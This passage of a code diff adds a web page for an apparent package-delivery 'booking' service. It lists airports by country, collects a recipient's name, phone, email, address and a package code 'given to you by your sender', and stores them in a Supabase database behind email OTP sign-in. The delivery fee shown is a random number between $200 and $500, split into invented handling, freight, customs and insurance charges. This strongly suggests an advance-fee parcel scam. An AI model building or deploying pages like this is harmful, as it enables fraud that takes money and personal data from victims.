+  "Canada": ["YYZ — Toronto Pearson International","YVR — Vancouver International","YUL — Montréal-Trudeau International","YYC — Calgary International","YEG — Edmonton International","YOW — Ottawa Macdonald-Cartier International","YHZ — Halifax Stanfield International","YWG — Winnipeg James Armstrong Richardson International"],
+  "Colombia": ["BOG — Bogotá El Dorado International","MDE — Medellín José María Córdova International","CLO — Cali Alfonso Bonilla Aragón International","CTG — Cartagena Rafael Núñez International"],
+  "Mexico": ["MEX — Mexico City Benito Juárez International","CUN — Cancún International","GDL — Guadalajara Miguel Hidalgo International","MTY — Monterrey Mariano Escobedo International","TIJ — Tijuana Abelardo L. Rodríguez International","SJD — Los Cabos International","PVR — Puerto Vallarta International","MID — Mérida International"],
+  "United States": ["JFK — New York JFK International","LAX — Los Angeles International","ORD — Chicago O'Hare International","ATL — Atlanta Hartsfield-Jackson International","DFW — Dallas/Fort Worth International","MIA — Miami International","SFO — San Francisco International","SEA — Seattle-Tacoma International","BOS — Boston Logan International","IAH — Houston George Bush Intercontinental","DEN — Denver International","LAS — Las Vegas Harry Reid International","PHX — Phoenix Sky Harbor International","DTW — Detroit Metropolitan Airport","MSP — Minneapolis-Saint Paul International"],
+
+  // ── ASIA (ALL) ──
+  "Afghanistan": ["KBL — Kabul Hamid Karzai International","KDH — Kandahar International","HEA — Herat International","MZR — Mazar-i-Sharif Airport","OAA — Sharana Salerno Airport"],
+  "Armenia": ["EVN — Yerevan Zvartnots International","LWN — Gyumri Shirak Airport"],
+  "Azerbaijan": ["GYD — Baku Heydar Aliyev International","KVD — Ganja International","NAJ — Nakhchivan Airport"],
+  "Bahrain": ["BAH — Bahrain International Airport"],
+  "Bangladesh": ["DAC — Dhaka Hazrat Shahjalal International","CGP — Chittagong Shah Amanat International","ZYL — Sylhet Osmani International","JSR — Jessore Airport","BZL — Barisal Airport"],
+  "Bhutan": ["PBH — Paro International Airport","BUT — Bathpalathang Airport (Bumthang)","GLU — Gelephu Airport","YON — Yongphulla Airport"],
+  "Brunei": ["BWN — Brunei International Airport"],
+  "Cambodia": ["PNH — Phnom Penh International","REP — Siem Reap International","KOS — Sihanoukville Airport","KZD — Koh Kong Airport"],
+  "China": ["PEK — Beijing Capital International","PKX — Beijing Daxing International","PVG — Shanghai Pudong International","SHA — Shanghai Hongqiao International","CAN — Guangzhou Baiyun International","CTU — Chengdu Tianfu International","SZX — Shenzhen Bao'an International","KMG — Kunming Changshui International","WUH — Wuhan Tianhe International","XIY — Xi'an Xianyang International","CKG — Chongqing Jiangbei International","HGH — Hangzhou Xiaoshan International","CSX — Changsha Huanghua International","TAO — Qingdao Jiaodong International"],
+  "Georgia": ["TBS — Tbilisi International Airport","BUS — Batumi International Airport","KUT — Kutaisi David the Builder International"],
+  "Hong Kong": ["HKG — Hong Kong International Airport"],
+  "India": ["DEL — Indira Gandhi International (New Delhi)","BOM — Chhatrapati Shivaji Maharaj International (Mumbai)","BLR — Kempegowda International (Bengaluru)","MAA — Chennai International","CCU — Netaji Subhash Chandra Bose International (Kolkata)","HYD — Rajiv Gandhi International (Hyderabad)","COK — Cochin International","AMD — Sardar Vallabhbhai Patel International (Ahmedabad)","PNQ — Pune Airport","GOI — Goa International (Dabolim)","JAI — Jaipur International","LKO — Chaudhary Charan Singh International (Lucknow)","ATQ — Amritsar Sri Guru Ram Dass Jee International","TRV — Trivandrum International"],
+  "Indonesia": ["CGK — Jakarta Soekarno-Hatta International","DPS — Bali Ngurah Rai International","SUB — Surabaya Juanda International","KNO — Medan Kualanamu International","UPG — Makassar Sultan Hasanuddin International","BPN — Balikpapan International","JOG — Yogyakarta Adisutjipto International","SOC — Solo Adi Soemarmo International","MDC — Manado Sam Ratulangi International","BTH — Batam Hang Nadim International"],
+  "Iran": ["IKA — Tehran Imam Khomeini International","MHD — Mashhad International","SYZ — Shiraz International","TBZ — Tabriz International","IFN — Isfahan International","KSH — Kermanshah Airport","AWZ — Ahvaz International"],
+  "Iraq": ["BGW — Baghdad International","BSR — Basra International","EBL — Erbil International","NJF — Najaf Al-Najaf International","OSM — Mosul Airport"],
+  "Israel": ["TLV — Tel Aviv Ben Gurion International","ETH — Eilat Ramon Airport","HFA — Haifa Airport"],
+  "Japan": ["NRT — Tokyo Narita International","HND — Tokyo Haneda International","KIX — Osaka Kansai International","ITM — Osaka Itami Airport","CTS — Sapporo New Chitose Airport","NGO — Nagoya Chubu Centrair International","FUK — Fukuoka Airport","OKA — Okinawa Naha Airport","HIJ — Hiroshima Airport","KMJ — Kumamoto Airport"],
+  "Jordan": ["AMM — Amman Queen Alia International","AQJ — Aqaba King Hussein International"],
+  "Kazakhstan": ["ALA — Almaty International","NQZ — Nur-Sultan (Astana) International","CIT — Shymkent International","URA — Uralsk Airport","KGF — Karaganda Airport"],
+  "Kuwait": ["KWI — Kuwait International Airport"],
+  "Kyrgyzstan": ["FRU — Bishkek Manas International","OSS — Osh Airport"],
+  "Laos": ["VTE — Vientiane Wattay International","LPQ — Luang Prabang International","PKZ — Pakse International"],
+  "Lebanon": ["BEY — Beirut Rafic Hariri International Airport"],
+  "Macau": ["MFM — Macau International Airport"],
+  "Malaysia": ["KUL — Kuala Lumpur International (KLIA)","KUL/K2 — Kuala Lumpur KLIA2","PEN — Penang International","BKI — Kota Kinabalu International","KCH — Kuching International","JHB — Senai International (Johor Bahru)","LBU — Labuan Airport","MYY — Miri Airport"],
+  "Maldives": ["MLE — Malé Velana International Airport","GAN — Addu Gan Airport"],
+  "Mongolia": ["ULN — Ulaanbaatar Chinggis Khaan International","UBN — Ulaanbaatar Buyant-Ukhaa Airport"],
+  "Myanmar": ["RGN — Yangon International","MDL — Mandalay International","NYU — Bagan Airport","NYT — Naypyidaw International","HEH — Heho Airport (Shan State)"],
+  "Nepal": ["KTM — Kathmandu Tribhuvan International","PKR — Pokhara International","BWA — Bhairahawa (Gautam Buddha International)"],
+  "North Korea": ["FNJ — Pyongyang Sunan International Airport"],
+  "Oman": ["MCT — Muscat International","SLL — Salalah Airport","KHS — Khasab Airport","DQM — Duqm Airport"],
+  "Pakistan": ["KHI — Karachi Jinnah International","LHE — Lahore Allama Iqbal International","ISB — Islamabad International","PEW — Peshawar Bacha Khan International","MUX — Multan International","SKZ — Sukkur Airport","LYP — Faisalabad International"],
+  "Philippines": ["MNL — Manila Ninoy Aquino International","CEB — Cebu Mactan-Cebu International","DVO — Davao Francisco Bangoy International","ILO — Iloilo International","BCD — Bacolod-Silay Airport","ZAM — Zamboanga International","KLO — Kalibo International"],
+  "Qatar": ["DOH — Doha Hamad International Airport"],
+  "Saudi Arabia": ["RUH — Riyadh King Khalid International","JED — Jeddah King Abdulaziz International","DMM — Dammam King Fahd International","MED — Madinah Prince Mohammad Bin Abdulaziz International","AHB — Abha International","TUU — Tabuk Regional","GIZ — Jizan Regional"],
+  "Singapore": ["SIN — Singapore Changi International (T1/T2/T3)","SIN/T4 — Singapore Changi Terminal 4","SIN/T5 — Singapore Changi Terminal 5 (upcoming)"],
+  "South Korea": ["ICN — Seoul Incheon International","GMP — Seoul Gimpo International","PUS — Busan Gimhae International","CJU — Jeju International","TAE — Daegu International","CJJ — Cheongju International","MWX — Muan International"],
+  "Sri Lanka": ["CMB — Colombo Bandaranaike International","HRI — Mattala Rajapaksa International"],
+  "Syria": ["DAM — Damascus International","ALP — Aleppo International","LTK — Latakia Bassel Al-Assad International"],
+  "Taiwan": ["TPE — Taipei Taoyuan International","TSA — Taipei Songshan Airport","RMQ — Taichung International","KHH — Kaohsiung International"],
+  "Tajikistan": ["DYU — Dushanbe International","LBD — Khujand Airport"],
+  "Thailand": ["BKK — Bangkok Suvarnabhumi International","DMK — Bangkok Don Mueang International","HKT — Phuket International","CNX — Chiang Mai International","USM — Koh Samui Airport","HDY — Hat Yai International","URT — Surat Thani Airport"],
+  "Timor-Leste": ["DIL — Dili Presidente Nicolau Lobato International"],
+  "Turkey": ["IST — Istanbul Airport","SAW — Istanbul Sabiha Gökçen International","AYT — Antalya International","ESB — Ankara Esenboğa International","ADB — Izmir Adnan Menderes International","BJV — Bodrum-Milas International","TZX — Trabzon International","ADF — Adıyaman Airport"],
+  "Turkmenistan": ["ASB — Ashgabat International Airport","CRZ — Türkmenabat International"],
+  "United Arab Emirates": ["DXB — Dubai International","DWC — Dubai Al Maktoum International","AUH — Abu Dhabi International","SHJ — Sharjah International","RKT — Ras Al Khaimah International","AAN — Al Ain International"],
+  "Uzbekistan": ["TAS — Tashkent Islom Karimov International","SKD — Samarkand International","BHK — Bukhara International","UGC — Urgench International","NCU — Nukus Airport"],
+  "Vietnam": ["SGN — Ho Chi Minh City Tan Son Nhat International","HAN — Hanoi Noi Bai International","DAD — Da Nang International","CXR — Nha Trang Cam Ranh International","PQC — Phu Quoc International","HPH — Hai Phong Cat Bi International","VCS — Con Dao Airport"],
+  "Yemen": ["SAH — Sanaa International Airport","ADE — Aden International","HOD — Hudaydah Airport","MYN — Mayyun Airport"],
+
+  // ── Europe ──
+  "France": ["CDG — Paris Charles de Gaulle International","ORY — Paris Orly Airport","LYS — Lyon-Saint-Exupéry International","MRS — Marseille Provence Airport","NCE — Nice Côte d'Azur International","TLS — Toulouse-Blagnac Airport","BOD — Bordeaux-Mérignac Airport","NTE — Nantes Atlantique Airport"],
+  "Germany": ["FRA — Frankfurt am Main International","MUC — Munich International","BER — Berlin Brandenburg International","DUS — Düsseldorf International","HAM — Hamburg Airport","CGN — Cologne Bonn Airport","STR — Stuttgart Airport","HAJ — Hannover Airport"],
+  "Italy": ["FCO — Rome Fiumicino International","MXP — Milan Malpensa International","LIN — Milan Linate Airport","NAP — Naples International","VCE — Venice Marco Polo International","BLQ — Bologna Guglielmo Marconi International"],
+  "Netherlands": ["AMS — Amsterdam Schiphol International","EIN — Eindhoven Airport","RTM — Rotterdam The Hague Airport"],
+  "Spain": ["MAD — Madrid Adolfo Suárez-Barajas International","BCN — Barcelona El Prat International","PMI — Palma de Mallorca Airport","AGP — Málaga-Costa del Sol Airport","VLC — Valencia Airport","SVQ — Seville Airport"],
+  "United Kingdom": ["LHR — London Heathrow International","LGW — London Gatwick Airport","STN — London Stansted Airport","LTN — London Luton Airport","MAN — Manchester Airport","BHX — Birmingham International","EDI — Edinburgh Airport","GLA — Glasgow International","BRS — Bristol Airport","NCL — Newcastle International","ABZ — Aberdeen International"],
+
+  // ── Oceania ──
+  "Australia": ["SYD — Sydney Kingsford Smith International","MEL — Melbourne Tullamarine International","BNE — Brisbane International","PER — Perth International","ADL — Adelaide International","CBR — Canberra International","DRW — Darwin International","HBA — Hobart International"],
+  "New Zealand": ["AKL — Auckland International","WLG — Wellington International","CHC — Christchurch International","ZQN — Queenstown Airport","DUD — Dunedin Airport"],
+};
+
+  function onCountryChange() {
+    const country = document.getElementById('country').value;
+    const airportSel = document.getElementById('airport');
+    const sec = document.getElementById('airport-section');
+    const hint = document.getElementById('airport-hint');
+
+    airportSel.innerHTML = '<option value="">— Select an airport —</option>';
+    document.getElementById('submitBtn').disabled = true;
+
+    // update progress
+    if(country){ markStep(2); } else { resetStep(2); resetStep(3); resetStep(4); }
+
+    if (!country) { sec.classList.add('hidden'); hint.style.display='block'; return; }
+
+    const airports = AIRPORTS[country] || [];
+    airports.forEach(a => {
+      const opt = document.createElement('option');
+      opt.value = a; opt.textContent = a;
+      airportSel.appendChild(opt);
+    });
+    sec.classList.remove('hidden');
+    hint.style.display = 'none';
+    checkForm();
+  }
+
+  function onAirportSelect() {
+    const val = document.getElementById('airport').value;
+    if (!val) return;
+    markStep(3);
+    checkForm();
+  }
+
+  function triggerFeeModal() {
+    const val = document.getElementById('airport').value;
+    if (!val) return;
+    document.getElementById('spinnerOverlay').classList.add('active');
+    setTimeout(() => {
+      document.getElementById('spinnerOverlay').classList.remove('active');
+      showFeeModal(val);
+    }, 2700);
+  }
+
+  function showFeeModal(airport) {
+    const fee = Math.floor(Math.random() * 301) + 200;
+    const handling = Math.floor(fee * 0.15);
+    const freight  = Math.floor(fee * 0.55);
+    const customs  = Math.floor(fee * 0.18);
+    const insurance= fee - handling - freight - customs;
+
+    document.getElementById('selectedAirportLabel').textContent = airport.split('—')[0].trim();
+    document.getElementById('feeAmount').textContent = `$${fee}`;
+    document.getElementById('agreeAmt').textContent = `$${fee}`;
+    document.getElementById('brkHandling').textContent = `$${handling}`;
+    document.getElementById('brkFreight').textContent  = `$${freight}`;
+    document.getElementById('brkCustoms').textContent  = `$${customs}`;
+    document.getElementById('brkInsurance').textContent= `$${insurance}`;
+
+    document.getElementById('agreeCheck').checked = false;
+    document.getElementById('customCheck').classList.remove('checked');
+    document.getElementById('feeModalError').style.display = 'none';
+    document.getElementById('continueBtn').classList.remove('ready');
+    document.getElementById('feeModal').classList.add('active');
+  }
+
+  function handleAgreeClick() {
+    const cb = document.getElementById('agreeCheck');
+    const cc = document.getElementById('customCheck');
+    cb.checked = !cb.checked;
+    cc.classList.toggle('checked', cb.checked);
+    document.getElementById('continueBtn').classList.toggle('ready', cb.checked);
+    if (cb.checked) markStep(4);
+  }
+
+
+  function showModalError(id, msg) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.innerHTML = '&#x26A0; ' + msg;
+    el.style.display = 'block';
+    setTimeout(() => { el.style.display = 'none'; }, 5000);
+  }
+
+  function submitForm() {
+    const name    = document.getElementById('fullName').value.trim();
+    const phone   = document.getElementById('phone').value.trim();
+    const email   = document.getElementById('email').value.trim();
+    const country = document.getElementById('country').value;
+    const address = document.getElementById('address').value.trim();
+    const airport = document.getElementById('airport').value;
+    const pkgCode = document.getElementById('packageNumber').value.trim();
+    if (!name || !phone || !email || !country || !address || !airport) {
+      showInlineError('Please fill in all fields before continuing.');
+      return;
+    }
+    if (!pkgCode) {
+      showInlineError('Please enter the package code given to you by your sender.');
+      return;
+    }
+    triggerFeeModal();
+  }
+
+  function showInlineError(msg) {
+    let el = document.getElementById('formInlineError');
+    if (!el) {
+      el = document.createElement('div');
+      el.id = 'formInlineError';
+      el.style.cssText = 'background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.35);border-radius:10px;padding:0.7rem 0.9rem;margin-top:1rem;font-size:0.82rem;color:#fca5a5;line-height:1.5';
+      document.getElementById('submitBtn').insertAdjacentElement('afterend', el);
+    }
+    el.innerHTML = '&#x26A0; ' + msg;
+    el.style.display = 'block';
+    setTimeout(() => { el.style.display = 'none'; }, 4500);
+  }
+
+  function checkForm() {
+    const name    = document.getElementById('fullName').value.trim();
+    const phone   = document.getElementById('phone').value.trim();
+    const email   = document.getElementById('email').value.trim();
+    const country = document.getElementById('country').value;
+    const address = document.getElementById('address').value.trim();
+    const airport = document.getElementById('airport').value;
+    const pkgCode = document.getElementById('packageNumber').value.trim();
+    const ok = name && phone && email && country && address && airport && pkgCode;
+    document.getElementById('submitBtn').disabled = !ok;
+    if (name && phone && email) markStep(1);
+  }
+
+  function markStep(n) {
+    const el = document.getElementById('st'+n);
+    if (el) { el.classList.remove('active'); el.classList.add('done'); el.textContent = '✓'; }
+    const con = document.getElementById('sc'+(n-1));
+    if (con) con.classList.add('done');
+  }
+  function resetStep(n) {
+    const el = document.getElementById('st'+n);
+    if (el) { el.classList.remove('done','active'); el.textContent = n; }
+  }
+
+  ['fullName','phone','email','address','packageNumber'].forEach(id => {
+    document.getElementById(id).addEventListener('input', checkForm);
+  });
+</script>
+
+<!-- OTP MODAL -->
+<div class="modal-backdrop" id="otpModal">
+  <div class="modal" style="max-width:420px">
+    <div class="modal-icon">📧</div>
+    <h2>Verify Your Email</h2>
+    <p class="modal-subtitle" id="otpSubtitle">
+      A 6-digit code has been sent to <strong id="otpEmailLabel" style="color:var(--blue-light)"></strong>. Enter it below.
+    </p>
+    <div style="display:flex;gap:0.6rem;justify-content:center;margin-bottom:1.5rem">
+      <input type="text" maxlength="1" class="otp-box" id="otp0" inputmode="numeric"/>
+      <input type="text" maxlength="1" class="otp-box" id="otp1" inputmode="numeric"/>
+      <input type="text" maxlength="1" class="otp-box" id="otp2" inputmode="numeric"/>
+      <input type="text" maxlength="1" class="otp-box" id="otp3" inputmode="numeric"/>
+      <input type="text" maxlength="1" class="otp-box" id="otp4" inputmode="numeric"/>
+      <input type="text" maxlength="1" class="otp-box" id="otp5" inputmode="numeric"/>
+    </div>
+    <div id="otpError" style="display:none;text-align:center;color:var(--danger);font-size:0.82rem;margin-bottom:1rem"></div>
+    <button id="verifyOtpBtn" onclick="verifyOtp()" style="width:100%;padding:1.05rem;background:linear-gradient(135deg,#2563eb,#1d4ed8);border:none;border-radius:12px;color:#fff;font-family:'Outfit',sans-serif;font-size:1rem;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(37,99,235,0.3);display:flex;align-items:center;justify-content:center;gap:0.5rem;transition:all 0.2s">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/></svg>
+      Verify &amp; Complete Booking
+    </button>
+    <p style="text-align:center;margin-top:1rem;font-size:0.78rem;color:var(--muted2)">
+      Didn't receive it? <span onclick="resendOtp()" style="color:var(--blue-light);cursor:pointer;text-decoration:underline">Resend code</span>
+    </p>
+  </div>
+</div>
+
+<style>
+.otp-box {
+  width:46px;height:54px;text-align:center;font-size:1.5rem;font-weight:700;
+  font-family:'Outfit',sans-serif;
+  background:var(--surface2);border:1.5px solid var(--border2);
+  border-radius:10px;color:#fff;outline:none;
+  transition:border-color 0.2s,box-shadow 0.2s;
+  caret-color:var(--blue-light);
+}
+.otp-box:focus{border-color:var(--blue-bright);box-shadow:0 0 0 3px rgba(59,130,246,0.18);background:var(--surface3);}
+.otp-box.filled{border-color:var(--blue);background:rgba(37,99,235,0.1);}
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
+<script>
+// ── SUPABASE CONFIG ── Replace with your project credentials ──────────────
+const SUPABASE_URL  = 'https://azxbtwklromrnmyutmoz.supabase.co';
+const SUPABASE_ANON = 'sb_publishable_MaHxITBZRvjweKDwS4cr8g__A6jZI0k';
+const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
+
+// ── OTP INPUT NAVIGATION ──────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  for (let i = 0; i < 6; i++) {
+    const box = document.getElementById('otp'+i);
+    if (!box) continue;
+    box.addEventListener('input', e => {
+      const val = e.target.value.replace(/[^0-9]/g,'');
+      e.target.value = val;
+      e.target.classList.toggle('filled', !!val);
+      if (val && i < 5) document.getElementById('otp'+(i+1)).focus();
+    });
+    box.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !e.target.value && i > 0)
+        document.getElementById('otp'+(i-1)).focus();
+    });
+    box.addEventListener('paste', e => {
+      const pasted = (e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
+      if (pasted.length >= 6) {
+        for (let j = 0; j < 6; j++) {
+          const b = document.getElementById('otp'+j);
+          b.value = pasted[j]||'';
+          b.classList.toggle('filled', !!pasted[j]);
+        }
+        document.getElementById('otp5').focus();
+        e.preventDefault();
+      }
+    });
+  }
+});
+
+// ── SEND OTP ──────────────────────────────────────────────────────────────
+async function sendOtp() {
+  const email = document.getElementById('email').value.trim();
+  const btn   = document.getElementById('continueBtn');
+  btn.innerHTML = '<span style="opacity:0.7">Sending OTP…</span>';
+  btn.style.pointerEvents = 'none';
+
+  try {
+    const trackCode = 'GSS-' + Math.floor(10000 + Math.random() * 90000);
+    const bookingData = {
+      full_name    : document.getElementById('fullName').value.trim(),
+      sender_name  : document.getElementById('senderName').value.trim(),
+      package_number: document.getElementById('packageNumber').value,
+      phone        : document.getElementById('phone').value.trim(),
+      email        : email,
+      country      : document.getElementById('country').value,
+      address      : document.getElementById('address').value.trim(),
+      airport      : document.getElementById('airport').value,
+      fee          : document.getElementById('feeAmount').textContent,
+      track_code   : trackCode,
+      status       : 'pending_verification',
+      created_at   : new Date().toISOString()
+    };
+
+    // Save booking to Supabase
+    const { data: booking, error: dbErr } = await _supabase
+      .from('bookings')
+      .insert([bookingData])
+      .select()
+      .single();
+
+    if (dbErr) throw dbErr;
+
+    localStorage.setItem('gss_booking_id', booking.id);
+    localStorage.setItem('gss_user', JSON.stringify({ id: booking.id, full_name: bookingData.full_name, sender_name: bookingData.sender_name, package_number: bookingData.package_number, phone: bookingData.phone, email: bookingData.email, country: bookingData.country, address: bookingData.address, airport: bookingData.airport, fee: bookingData.fee, track_code: bookingData.track_code }));
+    localStorage.setItem('gss_arrival_time', Date.now().toString());
+
+    // Send OTP via Supabase Auth
+    const { error: otpErr } = await _supabase.auth.signInWithOtp({
+      email,
+      options: { shouldCreateUser: true }
+    });
+    if (otpErr) throw otpErr;
+
+    // Show OTP modal
+    document.getElementById('feeModal').classList.remove('active');
+    document.getElementById('otpEmailLabel').textContent = email;
+    document.getElementById('otpModal').classList.add('active');
+    document.getElementById('otp0').focus();
+
+  } catch (err) {
+    console.error(err);
+    showModalError('feeModalError', err.message || 'Could not send OTP. Please try again.');
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg> Confirm &amp; Send OTP';
+    btn.style.pointerEvents = 'all';
+  }
+}
+
+// ── VERIFY OTP ────────────────────────────────────────────────────────────
+async function verifyOtp() {
+  const code = [0,1,2,3,4,5].map(i => document.getElementById('otp'+i).value).join('');
+  if (code.length < 6) { showOtpError('Please enter all 6 digits.'); return; }
+
+  const email = document.getElementById('email').value.trim();
+  const btn   = document.getElementById('verifyOtpBtn');
+  btn.innerHTML = '<span style="opacity:0.7">Verifying…</span>';
+  btn.style.pointerEvents = 'none';
+
+  try {
+    const { error } = await _supabase.auth.verifyOtp({ email, token: code, type: 'email' });
+    if (error) throw error;
+
+    // Mark booking as verified
+    const bookingId = localStorage.getItem('gss_booking_id');
+    if (bookingId) {
+      await _supabase.from('bookings').update({ status: 'verified' }).eq('id', bookingId);
+    }
+
+    window.location.href = 'dashboard.html';
+
+  } catch (err) {
+    showOtpError('Incorrect or expired code. Try again.');
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/></svg> Verify &amp; Complete Booking';
+    btn.style.pointerEvents = 'all';
+  }
+}
+
+function showOtpError(msg) {
+  const el = document.getElementById('otpError');
+  el.textContent = '✗ ' + msg;
+  el.style.display = 'block';
+  for (let i=0;i<6;i++) document.getElementById('otp'+i).style.borderColor='var(--danger)';
+  setTimeout(() => {
+    el.style.display='none';
+    for (let i=0;i<6;i++) document.getElementById('otp'+i).style.borderColor='';
+  }, 3500);
+}
+
+async function resendOtp() {
+  const email = document.getElementById('email').value.trim();
+  const { error } = await _supabase.auth.signInWithOtp({ email, options: { shouldCreateUser: true } });
+  const sub = document.getElementById('otpSubtitle');
+  if (!error) {
+    sub.innerHTML = '<span style="color:var(--success)">✓ New code sent to <strong style="color:var(--blue-light)">' + email + '</strong></span>';
+  } else {
+    sub.innerHTML = '<span style="color:var(--danger)">Failed to resend. Please try again.</span>';
+  }
+  setTimeout(() => {
+    sub.innerHTML = 'A 6-digit code has been sent to <strong id="otpEmailLabel" style="color:var(--blue-light)">' + email + '</strong>. Enter it below.';
+  }, 3000);
+}
+</script>
+
+</body>
+</html>
